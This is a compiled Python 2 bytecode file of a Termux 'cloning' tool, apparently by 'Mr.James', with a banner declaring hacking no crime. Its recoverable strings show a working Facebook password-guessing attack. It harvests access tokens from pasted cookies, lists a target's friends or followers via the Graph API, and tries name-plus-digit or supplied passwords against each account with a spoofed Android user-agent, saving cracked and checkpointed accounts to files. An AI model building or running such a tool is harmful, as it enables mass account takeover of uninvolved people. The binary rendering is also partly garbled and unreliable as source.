ó
Ô`c           @   sÿ  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z d  d l m Z d  d l m Z d Z d Z e  j d  y e  j d  Wn e k
 rí n Xe j d d	  Z e j d
 d  Z i e e  d 6e e  d 6e e  d 6d d 6d d 6d d 6d d 6d d 6Z e  j d  e  j d  d Z d   Z d   Z d   Z d   Z d    Z d!   Z  d"   Z! d#   Z" d$   Z# d%   Z$ d&   Z% e& d' k rûe   n  d S((   iÿÿÿÿN(   t
   ThreadPool(   t   ConnectionErrors   Mr.Jamess)   All rights reserved . Copyright  Mr.Jamess   termux-setup-storages   /sdcard/idsg    ÐsAg    8|Ai N  i@  s   x-fb-connection-bandwidths   x-fb-sim-hnis   x-fb-net-hnit	   EXCELLENTs   x-fb-connection-qualitys!   cell.CTRadioAccessTechnologyHSDPAs   x-fb-connection-types  Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]s
   user-agents!   application/x-www-form-urlencodeds   content-typet   Ligers   x-fb-http-engines   git pullt   clears  
[1;93mââââ   ââââ [1;96mââââââ [1;91mâââ     [1;97mâââ[1;92mâââ  âââ
[1;93mâââââ âââââ[1;96mââââââââ[1;91mâââ     [1;97mâââ[1;92mâââ ââââ
[1;93mâââââââââââ[1;96mââââââââ[1;91mâââ     [1;97mâââ[1;92mâââââââ 
[1;93mâââââââââââ[1;96mââââââââ[1;91mâââ     [1;97mâââ[1;92mâââââââ 
[1;93mâââ âââ âââ[1;96mâââ  âââ[1;91mâââââââ [1;97mâââ[1;92mâââ  âââ
[1;97mâââââââââââââââââââââââââââââââââââââââââââ
[1;90mâ£ HACKING IS NOT CRIME ITâS A GAME AGAINST OF THE SYSTEM 
[1;90mâ£ AUTHOR :[1;92m Malik Hasnain
[1;90mâ£ FROM :[1;92m Freedom Fighter 
[1;90mâ£ WARNING :[1;92m DON'T COPY MY SCRIPT 
[1;97mâââââââââââââââââââââââââââââââââââââââââââ c          C   st   y t  d d  }  t   WnS t t f k
 ro t j d  t GHd GHd GHd GHd GHd GHd GHd GHt   n Xd  S(	   Ns   access_token.txtt   rR   t    s   [1;31;1m~~~~ Login menu~~~~s   [1;92m[1] Login with FaceBooks   [1;92m[2] Login with tokens   [1;92m[3] Login with cookies(   t   opent   menut   KeyErrort   IOErrort   ost   systemt   logot
   log_menu_s(   t   t_check(    (    s   /sdcard/jampas1.pyt   log_menu7   s    c          C   sh   t  d  }  |  d k r" t   nB |  d k r8 t   n, |  d k rN t   n d GHd GHd GHt   d  S(   Ns    [1;93mSelect One: t   1t   2t   3R   s   \ Select valid option (   t	   raw_inputt   log_fbt	   log_tokent
   log_cookieR   (   t   s(    (    s   /sdcard/jampas1.pyR   J   s    


c          C   s"  t  j d  t GHd GHd GHd GHt d  }  t d  } yÄ t j d t d t  j } t	 j
 |  } d | k r© t d	 d
  } | j | d  | j   t   nS d | d k rÜ d GHd GHd GHt d  t   n  d GHd GHd GHt d  t   Wn d GHd GHt  j d  n Xd  S(   NR   R   s   [1;31;1mLogin with id/passs   [1;92m Id/mail/no: s    [1;93mPassword: s   http://localhost:5000/auth?id=s   &pass=t   locs   access_token.txtt   ws   www.facebook.comt   errors&    User must verify account before logins!   [1;92m Press enter to try again s    Id/Pass may be wrongs!    [1;92mPress enter to try again s   Exiting toolt   exit(   R   R   R   R   t   requestst   gett   uidt   pwdt   textt   jsont   loadsR   t   writet   closeR   R   (   t   lidt   pwdst   datat   qt   ts(    (    s   /sdcard/jampas1.pyR   Y   s<    




c          C   sc   t  j d  t GHd GHd GHd GHt d  }  d GHt d d  } | j |   | j   t   d  S(   NR   R   s   [1;93mLogin with tokens    [1;92mPaste token here: s   access_token.txtR   (   R   R   R   R   R   R$   R%   R   (   t   tokt   t_s(    (    s   /sdcard/jampas1.pyR   }   s    
c          C   s  t  j d  t GHd GHd GHd GHyÂ t d  }  i
 d d 6d d 6d	 d
 6d d 6d d 6d d 6d d 6d d 6d d 6|  d 6} t j d d | } t j d | j  } | j	 d  } t
 d d  } | j |  | j   t   Wn t k
 rd GHd GHd GHt d  t   ng t k
 rFd GHd GHd GHt d  t   n7 t j j k
 r|d GHd GHd GHt d  t   n Xd  S(    NR   R   s   [1;31;1mLogin Cookiess    Paste cookies here: sl   Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36s
   user-agents   https://m.facebook.com/t   referers   m.facebook.comt   hosts   https://m.facebook.comt   originR   s   upgrade-insecure-requestss#   id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7s   accept-languages	   max-age=0s   cache-controlsU   text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8t   accepts   text/html; charset=utf-8s   content-typet   cookiesG   https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_t   headerss	   (EAAA\w+)i   s   access_token.txtR   s   	Invalid cookiess!    [1;92mPress enter to try again (   R   R   R   R   R   R   t   ret   searchR!   t   groupR   R$   R%   R   t   AttributeErrorR   t   UnboundLocalErrort
   exceptionst   SSLError(   R1   R(   t   c1t   c2t   hasilt   ok(    (    s   /sdcard/jampas1.pyR      sV    






c          C   s¥  t  j d  y t d d  j   }  WnD t t f k
 rl d GHt GHd GHd GHd GHt j d  t	   n Xy3 t
 j d |   } t j | j  } | d } Wn t t f k
 rî t GHd GHd	 GHd GHt  j d
  t j d  t	   n< t
 j j k
 r)t GHd GHd GHd GHt d  t   n Xt  j d  t GHt d d  j   } d GHd | GHd GHd | GHd GHd GHd GHd GHd GHd GHd GHd GHd GHt   d  S(   NR   s   access_token.txtR   R   s    [1;31;1mLogin FB id to continuei   s+   https://graph.facebook.com/me?access_token=t   names   	 Account Cheekpoint[0;97ms   rm -rf access_token.txts!   	 Turn on mobile data/wifi[0;97ms6    [1;92mPress enter after turning on mobile data/wifi s   /sdcard/.hst.txts     [1;92mLogged in user: s    [1;93m Active token: s,    ------------------------------------------ s#   [1;92m[1] Crack with auto passwords'   [1;92m[2] Crack with manually passwords   [1;92m[3] View tokens   [1;92m[4] Logouts   [1;92m[5] Delete trash files(   R   R   R   t   readR	   R
   R   t   timet   sleepR   R   R   R"   R#   R!   R8   R   R   R   t   menu_s(   t   tokenR   R)   t   zR+   (    (    s   /sdcard/jampas1.pyR   »   s^    

		c          C   s   t  d  }  |  d k r" t   nn |  d k r8 t   nX |  d k rN t   nB |  d k rd t   n, |  d k rz t   n d GHd GHd GHt   d  S(	   Ns   [1;92mSelect One: R   R   R   t   4t   5R   s   	Select valid option(   R   t
   auto_crackt   choice_crackt   v_tokt   loutt   rtrashRB   (   t   ms(    (    s   /sdcard/jampas1.pyRB   ñ   s    




c           C   s£   y t  d d  j   a WnG t t f k
 rb t j d  t GHd GHd GHt j	 d  t
   n Xt j d  t GHd GHd GHd GHd GHd	 GHd
 GHd GHt   d  S(   Ns   access_token.txtR   R   s    	 Login FB id to continue[0;97mR   i   s%   [1;31;1m~~~~ Auto pass cracking ~~~~s   [1;92m[1] Public id clonings   [1;92m[2] Followers clonings   [1;92m[B] Back(   R   R?   RC   R	   R
   R   R   R   R@   RA   R   t   a_s(    (    (    s   /sdcard/jampas1.pyRG     s&    c             su  g  }  g    g   t  d  } | d k r±t j d  t GHd GHd GHd GHd GHd GHt  d   t  d   t  d	   t  d
   t  d  } ye t j d | d t  } t j | j	  } | d } t j d  t GHd GHd GHd GHd | GHWn7 t
 t f k
 r/d GHd GHd GHt  d  t   n Xt j d | d t  } t j | j	  } x| d D]B } | d } | d } | j d  d }	 |  j | d |	  qhWnÂ| d k rCt j d  t GHd GHd GHd GHd GHd GHt  d   t  d   t  d	   t  d
   t  d  } y` t j d | d t  } t j | j	  } | d } t j d  t GHd GHd GHd | GHWn7 t
 t f k
 r½d GHd GHd GHt  d  t   n Xt j d | d t d  } t j | j	  } x | d D]B } | d } | d } | j d  d }	 |  j | d |	  qúWn0 | d k rYt   n d GHd  t GHd GH|   d! t t |    GHt j d"  d# GHt j d"  d GHd$ d% GHd GHd& GHd GHd$ d% GHd GH       f d'   }
 t d(  } | j |
 |   d GHd$ d% GHd GHd) GHd* t t    d+ t t     GHd GHd$ d% GHd GHt  d,  t   d  S(-   Ns    [1;93mSelect One: R   R   R   s,   [1;31;1m~~~~ Auto pass public cracking ~~~~s7   [1;93m For example: 123 , 1234 , 1234, 786 , 12 , 1122s    [1;92m[1]Name + digit: s    [1;92m[2]Name + digit: s    [1;92m[3]Name + digit: s    [1;92m[4]Name + digit: s    [1;93m[â]Enter id: s   https://graph.facebook.com/s   ?access_token=R>   s*   [1;31;1m~~~~Auto pass public cracking~~~~s    [1;92mCloning from: s   	 Invalid user [0;97ms!    [1;92mPress enter to try again s   /friends?access_token=R(   t   idt    i    t   |R   s/   [1;31;1m~~~~ Auto pass followers cracking ~~~~s7    [1;93mFor example: 123 , 1234 , 1234, 786 , 12 , 1122s    [1;92mPress enter to try again s   /subscribers?access_token=s   &limit=999999t   0s   	Choose valid options    Total ids: g      à?s    [1;93mCrack Running i/   t   -s7   	[1;32mDont sale this tools, cause you use free[0;97mc            sq  |  } | j  d  \ } } yH| j    } t j d | d | d t j } t j |  } d | k rÈ d | d | d GHt d	 d
  } | j	 | d | d  | j
    j | |  nd | d k r/d | d | GHt d d
  } | j	 | d | d  | j
     j | |  n3| j    }	 t j d | d |	 d t j } t j |  } d | k rÙd | d |	 d GHt d	 d
  } | j	 | d |	 d  | j
    j | |	  nd | d k r@d | d |	 GHt d d
  } | j	 | d |	 d  | j
     j | |	  n"| j    }
 t j d | d |
 d t j } t j |  } d | k rêd | d |
 d GHt d	 d
  } | j	 | d |
 d  | j
    j | |
  nxd | d k rQd | d |
 GHt d d
  } | j	 | d |
 d  | j
     j | |
  n| j    } t j d | d | d t j } t j |  } d | k rûd | d | d GHt d	 d
  } | j	 | d | d  | j
    j | |  ng d | d k rbd | d | GHt d d
  } | j	 | d | d  | j
     j | |  n  Wn n Xd  S(   NRP   s   http://localhost:5000/auth?id=s   &pass=R2   R   s!   [1;92m[JAMES-HACKEDð] [1;32ms    | s   [0;97ms   /sdcard/ids/HOP_OK.txtt   as   
s   www.facebook.comR   s   [1;31;1m[JAMES-CP] s
   HOP_CP.txt(   t   splitt   lowerR   R   t   headerR!   R"   R#   R   R$   R%   t   appendt   apppend(   t   argt   userR   R>   t   pass1R(   R)   R=   t   cpt   pass2t   pass3t   pass4(   t   cpst   okst   p1t   p2t   p3t   p4(    s   /sdcard/jampas1.pyt   main  s    $

$

$

$

i   s    [1;92mCrack Dones    [1;92mTotal Ok/Cp:t   /s    [1;93mPress enter to back(   R   R   R   R   R   R   RC   R"   R#   R!   R	   R
   RG   t   rsplitRW   R   R   t   strt   lenR@   RA   R    t   map(   RN   RM   t   idtR   R)   RD   t   iR   t   nat   nmRf   t   p(    (   R`   Ra   Rb   Rc   Rd   Re   s   /sdcard/jampas1.pyRM     sÒ    








			I	)	
c           C   s£   y t  d d  j   a WnG t t f k
 rb t j d  t GHd GHd GHt j	 d  t
   n Xt j d  t GHd GHd GHd GHd GHd	 GHd
 GHd GHt   d  S(   Ns   access_token.txtR   R   s(   [1;31;1m~~~ Login FB id to continue ~~~R   i   s(   [1;31;1m~~~~ Manuall pass cracking ~~~~s   [1;92m[1] Public id clonings   [1;92m[2] Followers clonings   [1;92m[B] Back(   R   R?   RC   R	   R
   R   R   R   R@   RA   R   t   c_s(    (    (    s   /sdcard/jampas1.pyRH   Ù  s&    c             sf  g  }  g    g   t  d  } | d k r§t j d  t GHd GHd GHd GHt  d   t  d   t  d   t  d	   t  d
  } ye t j d | d t  } t j | j	  } | d } t j d  t GHd GHd GHd GHd | GHWn7 t
 t f k
 r%d GHd GHd GHt  d  t   n Xt j d | d t  } t j | j	  } x| d D]B } | d } | d } | j d  d }	 |  j | d |	  q^Wn½| d k r4t j d  t GHd GHd GHd GHt  d   t  d   t  d   t  d	   t  d  } ye t j d | d t  } t j | j	  } | d } t j d  t GHd GHd GHd GHd | GHWn7 t
 t f k
 r®d GHd GHd GHt  d  t   n Xt j d | d t d  } t j | j	  } x | d D]B } | d } | d } | j d  d }	 |  j | d |	  qëWn0 | d k rJt   n d GHd  t GHd GHt   d! t t |    GHt j d"  d# GHt j d"  d GHd$ d% GHd GHd& GHd GHd$ d% GHd GH       f d'   }
 t d(  } | j |
 |   d GHd$ d% GHd GHd) GHd* t t    d+ t t     GHd GHd$ d% GHd GHt  d,  t   d  S(-   Ns    [1;93mChoose option: R   R   R   s0   [1;31;1m ~~~~ Munally pass public cracking ~~~~s    [1;92m[1]Password: s    [1;92m[2]Password: s    [1;92m[3]Password: s    [1;92m[4]Password: s    [1;93m[â]Enter id: s   https://graph.facebook.com/s   ?access_token=R>   s1   [1;31;1m ~~~~ Manually pass public cracking ~~~~s    Cloning from: s   	 Invalid user [0;97ms    Press enter to try again s   /friends?access_token=R(   RN   RO   i    RP   R   s3   [1;31;1m~~~~ Manually pass followers cracking ~~~~s    [1;93mEnter id: s+   [1;31;1m~~~ Manually followers cracking~~~s   Press enter to try again s   /subscribers?access_token=s   &limit=999999RQ   s   	 Choose valid options    Total ids: g      à?s     [1;31;1m~~~ Crack Running ~~~ i/   RR   s   	Usieng Free Tools Dont Salec            s1  |  } | j  d  \ } } yt j d | d  d t j } t j |  } d | k r¸ d | d  d GHt d	 d
  } | j | d  d  | j	    j
 |   njd | d k rd | d  GHt d d
  } | j | d  d  | j	     j
 |   nt j d | d  d t j } t j |  } d | k r¹d | d  d GHt d	 d
  } | j | d  d  | j	    j
 |   nid | d k r d | d  GHt d d
  } | j | d  d  | j	     j
 |   nt j d | d  d t j } t j |  } d | k rºd | d  d GHt d	 d
  } | j | d  d  | j	    j
 |   nhd | d k r!d | d  GHt d d
  } | j | d  d  | j	     j
 |   nt j d | d  d t j } t j |  } d | k r»d | d  d GHt d	 d
  } | j | d  d  | j	    j
 |   ng d | d k r"d | d  GHt d d
  } | j | d  d  | j	     j |   n  Wn n Xd  S(   NRP   s   http://localhost:5000/auth?id=s   &pass=R2   R   s!   [1;92m[JAMES-HACKEDð] [1;32ms    | s   [0;97ms   /sdcard/ids/HOP_OK.txtRS   s   
s   www.facebook.comR   s   [1;31;1m[JAMES-CP] s
   HOP_CP.txt(   RT   R   R   RV   R!   R"   R#   R   R$   R%   RW   RX   (   RY   RZ   R   R>   R(   R)   R=   R\   (   R`   Ra   R[   R]   R^   R_   (    s   /sdcard/jampas1.pyRf   T  sz    $

$

$

$

i   s    [1;92mCrack Dones   [1;92m Total Ok/Cp:Rg   s   [1;93m Press enter to back(   R   R   R   R   R   R   RC   R"   R#   R!   R	   R
   RH   Rh   RW   RG   R   R   Rq   Ri   Rj   R@   RA   R    Rk   (   RN   RM   Rl   R   R)   RD   Rm   R   Rn   Ro   Rf   Rp   (    (   R`   Ra   R[   R]   R^   R_   s   /sdcard/jampas1.pyRq   ò  sÌ    








			E	)	
t   __main__('   R   t   sysR@   t   datetimeR3   t	   threadingR"   t   randomR   t   hashlibt	   cookielibt   uuidt   multiprocessing.poolR    t   requests.exceptionsR   t
   __author__t   __copyrightR   t   mkdirt   OSErrort   randintt   bdt   simt   reprRV   R   R   R   R   R   R   R   RB   RG   RM   RH   Rq   t   __name__(    (    (    s   /sdcard/jampas1.pyt   <module>   s^   
			$		0	6			¼		´


	y